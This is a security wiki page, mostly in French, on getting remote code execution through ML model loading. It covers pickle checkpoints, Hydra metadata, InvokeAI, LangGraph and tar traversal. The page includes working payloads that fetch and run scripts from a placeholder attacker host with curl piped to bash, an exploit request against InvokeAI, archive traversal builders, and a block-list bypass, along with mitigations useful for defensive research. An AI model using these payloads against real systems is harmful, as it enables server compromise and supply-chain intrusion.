# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Les modèles de Machine Learning sont généralement partagés dans différents formats, tels que ONNX, TensorFlow, PyTorch, etc. Ces modèles peuvent être chargés sur les machines des développeurs ou sur des systèmes de production pour être utilisés. En général, les modèles ne devraient pas contenir de code malveillant, mais il existe certains cas où le modèle peut être utilisé pour exécuter du code arbitraire sur le système, soit comme fonctionnalité prévue, soit à cause d’une vulnérabilité dans la bibliothèque de chargement du modèle.

Au moment de la rédaction, voici quelques exemples de ce type de vulnérabilités :

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malveillant dans le checkpoint du modèle entraîne l’exécution de code (en contournant la protection `weights_only`)           | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + téléchargement de modèle malveillant provoque l’exécution de code ; RCE par désérialisation Java dans l’API de management        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Un checkpoint non fiable déclenche un pickle reducer pendant `load_model_trainer_states_from_checkpoint` → exécution de code dans le worker ML | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | La clé `filter` contrôlée par l’utilisateur injecte une syntaxe SQL/JSON-path, `UNION SELECT` fabrique une fausse ligne de checkpoint, puis la désérialisation `msgpack` importe et appelle du code Python choisi par l’attaquant | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Le chargement d’un modèle depuis YAML utilise `yaml.unsafe_load` (exécution de code) <br> Le chargement d’un modèle avec une couche **Lambda** exécute du code Python arbitraire | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Un modèle `.tflite` construit spécialement déclenche un integer overflow → corruption du heap (RCE potentielle)                       | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Charger un modèle via `joblib.load` exécute le pickle avec un payload `__reduce__` contrôlé par l’attaquant                            | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` permettait par défaut des tableaux d’objets pickled – un `.npy/.npz` malveillant déclenche l’exécution de code           | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Le chemin des external-weights d’un modèle ONNX peut sortir du répertoire (lecture de fichiers arbitraires) <br> Un tar ONNX malveillant peut écraser des fichiers arbitraires (menant à RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Un modèle avec un opérateur custom nécessite de charger du code natif de l’attaquant ; des graphes de modèle complexes abusent de la logique pour exécuter des calculs non prévus | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | L’utilisation de l’API de chargement de modèle avec `--model-control` activé permet un path traversal relatif pour écrire des fichiers (par ex. écraser `.bashrc` pour RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Un fichier modèle GGUF mal formé provoque des heap buffer overflows dans le parser, permettant l’exécution de code arbitraire sur le système victime | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Un modèle HDF5 malveillant (`.h5`) avec du code dans une couche Lambda s’exécute encore au chargement (Keras safe_mode ne couvre pas l’ancien format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | De nombreux outils ML (par ex. formats de modèle basés sur pickle, `pickle.load` de Python) exécuteront du code arbitraire intégré dans les fichiers de modèle, sauf mitigation | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Les métadonnées/config du modèle contrôlées par l’attaquant définissent `_target_` sur n’importe quel callable (par ex. `builtins.exec`) → exécuté pendant le chargement, même avec des formats “safe” (`.safetensors`, `.nemo`, `config.json` du repo) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

De plus, il existe certains modèles python basés sur pickle, comme ceux utilisés par [PyTorch](https://github.com/pytorch/pytorch/security), qui peuvent être utilisés pour exécuter du code arbitraire sur le système s’ils ne sont pas chargés avec `weights_only=True`. Donc, tout modèle basé sur pickle peut être particulièrement vulnérable à ce type d’attaques, même s’il n’est pas सूची dans le tableau ci-dessus.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` importe et appelle n’importe quel `_target_` en notation pointée dans un objet de configuration/métadonnées. Lorsque des bibliothèques transmettent des **métadonnées de modèle non fiables** à `instantiate()`, un attaquant peut fournir un callable et des arguments qui s’exécutent immédiatement pendant le chargement du modèle (aucun pickle requis).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Points clés :
- Déclenché avant l'initialisation du modèle dans NeMo `restore_from/from_pretrained`, les codeurs uni2TS HuggingFace, et les loaders FlexTok.
- La block-list de chaînes de Hydra est contournable via des chemins d'import alternatifs (par ex. `enum.bltns.eval`) ou des noms résolus par l'application (par ex. `nemo.core.classes.common.os.system` → `posix`).
- FlexTok parse aussi des métadonnées stringifiées avec `ast.literal_eval`, ce qui permet un DoS (explosion CPU/mémoire) avant l'appel Hydra.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` est une interface web open-source populaire pour Stable-Diffusion. Les versions **5.3.1 – 5.4.2** exposent l'endpoint REST `/api/v2/models/install` qui permet aux utilisateurs de télécharger et charger des modèles depuis des URLs arbitraires.

En interne, l'endpoint appelle finalement :
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Lorsque le fichier fourni est un **PyTorch checkpoint (`*.ckpt`)**, `torch.load` effectue une **pickle deserialization**.  Comme le contenu provient directement de l’URL contrôlée par l’utilisateur, un attaquant peut intégrer un objet malveillant avec une méthode `__reduce__` personnalisée à l’intérieur du checkpoint ; la méthode est exécutée **pendant la désérialisation**, entraînant une **remote code execution (RCE)** sur le serveur InvokeAI.

La vulnérabilité a reçu le code **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Créer un checkpoint malveillant :
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hébergez `payload.ckpt` sur un serveur HTTP que vous contrôlez (par ex. `http://ATTACKER/payload.ckpt`).
3. Déclenchez le endpoint vulnérable (aucune authentification requise) :
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Lorsque InvokeAI télécharge le fichier, il appelle `torch.load()` → le gadget `os.system` s’exécute et l’attaquant obtient l’exécution de code dans le contexte du processus InvokeAI.

Exploit prêt à l’emploi : le module **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatise tout le flux.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag par défaut **false**)  
•  `/api/v2/models/install` accessible par l’attaquant  
•  Le processus a les permissions pour exécuter des commandes shell

#### Mitigations

* Mettre à niveau vers **InvokeAI ≥ 5.4.3** – le patch définit `scan=True` par défaut et effectue un scan malware avant la désérialisation.
* Lors du chargement programmatique de checkpoints, utiliser `torch.load(file, weights_only=True)` ou le nouveau helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Imposer des allow-lists / signatures pour les sources de modèles et exécuter le service avec le moindre privilège.

> ⚠️ Rappelez-vous que **tout** format Python basé sur pickle (y compris de nombreux fichiers `.pt`, `.pkl`, `.ckpt`, `.pth`) est intrinsèquement non sûr à désérialiser à partir de sources non fiables.

---

Exemple d’une mitigation ad hoc si vous devez absolument maintenir d’anciennes versions d’InvokeAI derrière un reverse proxy :
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (part of Merlin) exposait un chargeur de checkpoint non sûr qui appelait directement `torch.load()` sur des chemins fournis par l’utilisateur. Comme `torch.load` s’appuie sur `Python` `pickle`, un checkpoint contrôlé par un attaquant peut exécuter du code arbitraire via un reducer pendant la désérialisation.

Chemin vulnérable (avant correctif) : `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Pourquoi cela mène à du RCE : dans `Python pickle`, un objet peut définir un reducer (`__reduce__`/`__setstate__`) qui renvoie une callable et des arguments. La callable est exécutée pendant l’unpickling. Si un tel objet est présent dans un checkpoint, il s’exécute avant que les weights ne soient utilisés.

Exemple minimal de checkpoint malveillant :
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized checkpoints/models partagés via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`. The new loader validates types/fields and prevents arbitrary callables from being invoked during load.

Defensive guidance specific to PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Charger le modèle :
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD expose un endpoint `resnet` qui désérialise des données contrôlées par l’utilisateur. ZDI a confirmé qu’un attaquant à distance peut contraindre une victime à charger une page/fichier malveillant, faire en sorte qu’il envoie un blob sérialisé forgé vers ce endpoint, et déclencher la désérialisation en tant que `root`, entraînant une compromission complète.

Le flux d’exploitation reprend l’abus classique de pickle :
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Tout gadget atteignable pendant la désérialisation (constructeurs, `__setstate__`, callbacks du framework, etc.) peut être weaponized de la même façon, quel que soit le transport : HTTP, WebSocket, ou un fichier déposé dans un répertoire surveillé.



### LangGraph checkpointer SQLi → MessagePack RCE

Cette chaîne d’attaque est intéressante parce que l’attaquant **n’a pas besoin de téléverser un fichier de modèle malveillant**. À la place, l’application expose une **AI-agent persistence API** (`get_state_history(..., filter=...)`) et l’entrée utilisateur atteint le générateur de requêtes du checkpointer.

#### 1. SQLi structurel dans les filtres de métadonnées

Un pattern SQLite vulnérable ressemblait à :
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
La valeur est liée plus tard, mais `query_key` est concaténé dans la **chaîne du chemin JSON**, donc un `'` dans la clé du dictionnaire sort de `'$.{query_key}'` et injecte du SQL. La même leçon s’applique aux **JSON paths, identifiers, operators, `LIMIT`, et aux champs TTL** : les placeholders ne protègent que les valeurs, pas la syntaxe structurelle de la requête.

#### 2. `UNION SELECT` peut cibler des sinks en aval, pas seulement le vol de données

La requête renvoie `type` et des bytes `checkpoint` sérialisés, qui sont ensuite consommés comme :
```python
self.serde.loads_typed((type, checkpoint))
```
Cela signifie qu’une SQLi dans la clause `WHERE` peut injecter une **fausse ligne de résultat** :
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Si un code ultérieur analyse, désérialise, écrit ou exécute une colonne sélectionnée, mappez ces colonnes à leurs sinks. Dans ce cas, la fausse ligne transforme SQLi en **attacker-controlled deserialization**.

#### 3. Les hooks d’extension MessagePack non sûrs sont équivalents à des code gadgets

Le chemin `msgpack` de LangGraph utilisait un hook d’extension personnalisé qui dépaquetait un tuple imbriqué et exécutait :
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Ainsi, un objet d’extension MessagePack encodant quelque chose d’équivalent à `("os", "system", "id > /tmp/pwned")` importe `os`, résout `system`, et exécute la commande. Lors de l’examen des frameworks AI, inspectez les **custom MessagePack/JSON/pickle revivers** pour des dynamic imports, de la reflection, ou de l’arbitrary callable dispatch.

#### 4. Practical audit pattern for agent frameworks

Passez en revue toute entrée contrôlée par l’utilisateur qui atteint :
- state history / memory / replay / checkpoint listing APIs
- structured filter builders that generate SQL or Redis query fragments
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths that trust rows returned from the persistence layer

Cette chaîne spécifique a affecté des déploiements LangGraph self-hosted utilisant **SQLite** ou **Redis** checkpointers lorsque des utilisateurs non fiables pouvaient contrôler `filter`. Les versions corrigées indiquées dans la divulgation étaient `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, et `langgraph-checkpoint 4.0.1+`.

## Models to Path Traversal

Comme indiqué dans [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la plupart des formats de models utilisés par différents frameworks AI sont basés sur des archives, généralement `.zip`. Par conséquent, il peut être possible d’abuser de ces formats pour réaliser des path traversal attacks, permettant de lire des fichiers arbitraires depuis le système où le model est chargé.

Par exemple, avec le code suivant, vous pouvez créer un model qui créera un fichier dans le répertoire `/tmp` lors du chargement :
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ou, avec le code suivant, vous pouvez créer un model qui créera un symlink vers le répertoire `/tmp` lorsqu’il sera chargé :
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Plongée approfondie : désérialisation .keras de Keras et chasse aux gadgets

Pour un guide ciblé sur les internes de .keras, le RCE via Lambda-layer, le problème d’import arbitraire dans ≤ 3.8, et la découverte de gadgets après correctif à l’intérieur de l’allowlist, voir :


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Références

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [Commit de correctif InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Documentation du module Rapid7 Metasploit](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [Blog ZDI – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [Avis ZDI : ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Commit de correctif Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Chargeur vulnérable pré-correctif (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [PoC de checkpoint malveillant (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Chargeur post-correctif (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Commit de block-list Hydra (avertissement sur le RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
